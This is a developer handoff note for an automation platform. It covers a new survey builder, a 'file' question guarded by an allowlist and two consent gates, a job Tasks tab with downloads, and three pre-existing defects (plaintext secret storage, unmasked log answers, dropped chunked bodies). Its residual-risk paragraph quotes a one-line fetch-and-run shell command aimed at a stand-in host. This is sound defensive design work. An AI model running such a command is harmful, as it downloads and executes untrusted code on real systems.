# Handoff Document

Rewrite the "Current Status" section when stopping mid-task or handing off, per `.AGENTS/AGENTS.md`.

## Current Status (this session)

**Branch `feature/survey-builder`, 9 commits, stacked on `feature/section-row-actions`
(pushed, `17e240c`), which is stacked on `feature/job-cancel`, off `main` at `227fc9e`.**

Items C and E are both done. C grew a second half the list did not have -- **a `file` survey
question**, with the executable-content policy that has to come with it -- and E turned out to
rest on a **structural asymmetry nobody had written down**, which is the finding to read first.

### The finding: neither record covers every job

This platform keeps two records of a run and they are COMPLEMENTARY, not alternative.

| | runbook job | playbook job | after the broker's window |
|---|---|---|---|
| Run journal | per-node, rich | **none, ever** | still there |
| Log output | 2 events per device | per-task, rich | **gone** |

`engine.WithJournal` is attached in exactly two places and neither is the legacy adapter, so a
playbook job produces zero journal rows permanently. The mirror image is that the native adapter
publishes exactly two job-log events per dispatch, `started` and one completion summary, so
per-task LIVE output exists only for a playbook job.

Every piece of item E follows from that. The Tasks tab's empty state has to say which kind of
job this is and where the other kind's detail lives. The Download control has to be a chooser
resolved per record, because a fixed pair of links hands an operator an empty file about half the
time. Done that way, every job gets exactly one useful download.

There is a tempting fix in reach and it is NOT free: `internal/engine` already emits a per-node
event field-for-field identical to `wire.JobEvent`, and `internal/adapters/native` hands the
executor an in-process bus and drops them. That is deliberate, with a stated reason (collision
with the job.log stream), so forwarding them is overturning a recorded decision rather than
picking up free money. It would give native jobs real per-task live output and make a log
download worth having for them.

### Item C: the survey builder

The survey was the largest read-only object in the product. Its model has been complete since
the Templates view was built and the only way to author one was the JSON API or the database.
It is now authored from its own section: add in the header, then edit, remove and move on each
row, all four naming one narrowed endpoint (`PUT /templates/{id}/survey`, `set-survey`).

**Reorder is what needed the one new thing.** `RowAction.Applies` took only the `Row`, which
cannot answer "is this the first one": a Row's Cells are display strings and its ID is author
data, so reading an ordinal out of either is parsing a label. It now takes a `RowPosition`
(`Index`, `Count`, `First()`, `Last()`), so Move up is withheld on the first row and Move down
on the last. Nothing implemented the old signature, so the widening cost two test call sites.
This is the addition the previous handoff said reorder would need, and it is the shape it said
it would be.

Two doc comments had gone stale and were corrected in the same change rather than left:
`RowAction`'s still said a row control never prompts (item B made that false), and the
templates writer gave "the shared form machinery has no control for it" as the reason the
survey is carried forward.

### The `file` question, and the part worth reading

A survey can now ask for a file. The answer is the file's own text carried as an ordinary extra
variable, so every existing consumer reads it unchanged. It is bounded at 32 KiB (chosen
against `decodeJSON`'s existing 64 KiB body cap, not for roundness), treated as secret, and
proved to be text.

**The content rule is an allowlist, and that is the whole design.** The first sketch was a table
of magic numbers plus a `#!` test. A design panel killed it: a denylist fails OPEN on every
shape nobody listed, and the named bypasses (a BOM before the shebang, UTF-16, a zip, a
polyglot) all live in that gap. What shipped is "valid UTF-8, no NUL anywhere, no byte-order
mark, `#!` at offset zero exactly". An ELF is refused because it carries NUL, not because
anybody listed ELF. LESSONS_LEARNED #190.

**Two gates, and the deployment's half is a live kill switch.** A file opening with an
interpreter line needs both `PLEIADES_SURVEY_FILE_ALLOW_PROGRAM_CONTENT` on the Controller and
`allow_program_content` on the question. The deployment's half is read at startup, threaded as a
value, and consulted at every launch rather than at authoring time, so clearing it and
restarting stops templates that already carry the flag. The dispatcher ASSIGNS it onto
`launch.Config` immediately before resolving, overwriting whatever the caller put there, because
a defaulting version lets anybody who can build a Config grant themselves the deployment's
consent. Both properties have their own test; the assignment was proved by a negative control.
LESSONS_LEARNED #191.

**The residual risk is in the code, not only here.** This refuses a file that ANNOUNCES itself
as a program and cannot refuse one that IS one. A text file holding `curl evil.sh | sh` passes
every test and is accepted with both gates shut. The danger lives in what the automation does
with an answer, and a runbook may already pipe any `text` answer to a shell with no flag at all.
The flag is named `AllowProgramContent` rather than `AllowExecutableFiles` for exactly that
reason. What the gates buy is separation of duty. The untaken fix is a gate on what a runbook
may DO with an answer, which is much larger work.

**The launch control is a textarea, not a file picker.** Every write in this UI is parsed with
`r.ParseForm`, which does not read a multipart body at all, so an `<input type="file">` would
post the filename and silently blank every other control on the form. The picker is its own
piece of work on the form pipeline (see below). What reaches the automation is identical.

### Three pre-existing defects found, all verified, none fixed

Each was found by a parallel sweep and then confirmed directly with `go_symbol_references` or by
reading the code, because two of them were first reported by an agent and agents are wrong
sometimes. They are **not** introduced by this branch.

1. **`jobs.extra_vars` is plaintext.** `cmd/controller` registers crypto hooks for `Device`,
   `SavedLaunchConfig`, `Credential` and `MeshSigningKey` only. A secret survey answer is
   encrypted in `saved_launch_configs.answers` and in the clear in `jobs.extra_vars`, in the
   same database. The file question makes the values flowing through it larger and more likely
   to be key material.
2. **A survey answer never reaches the log masker.** `wire.Injected.Mask` is built from
   credential artifacts only, so a task that echoes a password or file answer lands it in the
   job log unredacted. `internal/credtype/inputs.go` claimed otherwise and has been corrected.
   Deliberately not closed by adding survey answers to `redact.Literals`: a 32 KiB literal in
   the process-wide set would scrub enormous unrelated substrings out of every later log line.
3. **A chunked launch silently discards its body.** `internal/api/dispatcher.go` decodes only
   `if r.ContentLength > 0`; a chunked POST has `-1`, so every answer and override is dropped
   and the launch returns 202 having run the template's defaults. Two sibling handlers share the
   shape, where an empty body is legitimate. The launch one is not. One line to fix.

A fourth, recorded as FAILURE_PATTERNS #228: `routing.CheckInjectable` has one production
caller, and the UI's own credential-binding action writes straight to the store, so an env/file
binding made through `/ui` is caught only by the run-time backstop.

### Item E: the Tasks tab and Download

The run journal had been WRITE-ONLY since it shipped: a table with migrations in both dialects,
an index declared with a doc comment naming exactly this query, a subscriber the Controller
refuses to start without, and no reader anywhere. `journal.EntStore.ForJob` is its first.

Both halves of the recorded sizing were wrong. "No API endpoint exposes it" is true and
irrelevant -- a `view.Section` reads its port directly and needs no endpoint, no `auth.LinkRel`
and no handler, which the Device outcomes section on the same page already proved. "Download has
no route shape to reuse" is false twice: `/{resource}/chart.json` is already a non-HTML UI route
with its own scope check, and `/{resource}/{id}/logs` already proves a per-record static segment
coexists with the `/{id}/{action}` wildcard.

What it actually cost was the honesty work, and that produced two new seams:

- **`Section.Note`**, a line resolved per RECORD rather than declared once. The journal scales as
  devices times nodes, so the read is bounded, and a table capped at 500 rows of a longer run
  shows a partial record looking exactly like a complete one.
- **`view.DownloadSpec`**, a list resolved per record, with `Available` checked twice -- when the
  control is drawn and again when the link is followed, because a log window expires in between.
  Removing the second check made a record with nothing to give serve a 200.

Two format decisions worth not re-litigating. The journal downloads as **CSV** because it is a
flat table someone sorts and pastes into a ticket, and it carries no secret by construction. The
log downloads as **NDJSON** rather than a JSON array, because an array needs its closing bracket
written after the last message, which a drain that fails partway cannot do.

The log download is withheld while a job is RUNNING. The subject has no end-of-stream marker, so
a drain stops at whatever had arrived, and a file that silently ends mid-run is indistinguishable
from a run that ended there.

### The list

| Item | What it is | First sized | State |
|---|---|---|---|
| B | Section write path, row half | S | **DONE.** Add, edit in place and remove on a credential type's inputs. |
| C | Survey builder | S add / M edit | **DONE**, plus the `file` question type and its two gates. |
| E | Tasks tab and Download | M | **DONE.** The journal's first reader, a Tasks tab, and a per-job download chooser. |
| F | Users: password reset, team display | M | `internal/apispec` declares no password endpoint of any kind. No team-member port. |
| G | Inventory Sources | M | New entity plus both dialects' migrations. D's runner and history pattern is reusable. |
| H | Execution envs, instance groups, max hosts | L | Both UI resources exist at `view.StatusDeclared`. The heartbeat is a file, not a registration. |

### Decisions left, not improvised

1. **Forwarding the engine's per-node events**, described above. It would give native jobs real
   per-task live output and make their log download worth having, and it overturns a recorded
   decision, so it is a judgement rather than a task.
2. **The file picker**, and it is DEARER than this document first said. The CSRF token is a
   hidden input, which in a multipart form lives inside the body, and `h.csrf` runs before the
   handler and reads it through `ParseForm` -- which yields nothing for a multipart body. So the
   MIDDLEWARE has to parse the whole body before it can verify the token, and `r.MultipartReader`
   is no escape hatch because it permanently disables `ParseMultipartForm` downstream. Add the
   eleven other `ParseForm` sites, each of which silently blanks every control when handed a
   multipart body today, and this is a change to the write path rather than to one handler.
3. **A template can store an armed flag a deployment refuses.** `Survey.Validate` accepts
   `allow_program_content` whatever the deployment says, so a template copied to a consenting
   deployment keeps its author's intent. The authoring form withholds the checkbox where it
   would do nothing and the Survey section's PROGRAM CONTENT column reads "refused here", but
   the stricter reading of "don't offer choices that can only fail" would refuse the save. A
   judgement call; the opposite call is defensible.
4. **The three defects above.** Each is the user's to schedule. (3) is one line.
5. Everything the previous entry left open is still open: the `running` watchdog, the
   result-before-row ordering, the eighteen unnarrowed flaky entries, the two proposed gate
   rules, the DLQ consumer and the dogfood pass. See `HANDOFF_ARCHIVE.md`.

### Next step

F, G or H, and the scouts found two of the three are not what the list says. **F**'s premise
question is answered: this platform DOES own local auth, which
`tests/e2e/localauth_release_gate_test.go` exercises, so the password half is real work rather
than somebody else's. **G** is likely cheaper than "a new entity plus both dialects'
migrations", because `internal/inventory/syncplugin` already has a real four-stage plugin
contract with a conformance suite, and an inventory source may be little more than a stored
configuration pointing at one. **H** is the only one nobody has re-sized.
